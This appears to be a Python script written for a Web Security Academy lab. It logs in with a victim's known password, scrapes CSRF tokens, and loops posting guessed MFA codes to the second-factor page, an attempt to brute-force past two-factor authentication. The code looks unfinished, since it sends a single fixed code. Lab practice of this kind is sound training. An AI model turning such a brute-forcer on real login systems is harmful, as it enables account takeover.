#! /usr/bin/env python3

import requests
import re

csrf_re = re.compile('[a-zA-Z0-9]{32}')
login_page = 'https://ac481f8e1f62c698c0d41b0e002900f1.web-security-academy.net/login'
creds = {'username': 'carlos', 'password': 'montoya'}


def get_csrf_token(text):
    csrf_token = re.findall(csrf_re, text)[0]
    if csrf_token:
        return csrf_token
while True:
    with requests.Session() as req:
        # Obtain current csrf token from html on first factor
        # auth page
        response = req.get(login_page)
        if 'csrf' in response.text:
            csrf_token = get_csrf_token(response.text)
            creds.update({'csrf': csrf_token})
            post_data = req.post(login_page, data=creds)
            # Obtain second csrf token from html of second factor
            # auth page
            if 'csrf' in post_data.text:
                new_url = post_data.url 
                text = req.get(new_url)
                new_csrf = get_csrf_token(post_data.text)
                print('#################################################')
                for i in range(2):
                    payload = {'mfa-code': '1234', 'csrf': new_csrf}
                    second_f = req.post(new_url, data=payload)
                    print(second_f.headers, new_csrf)


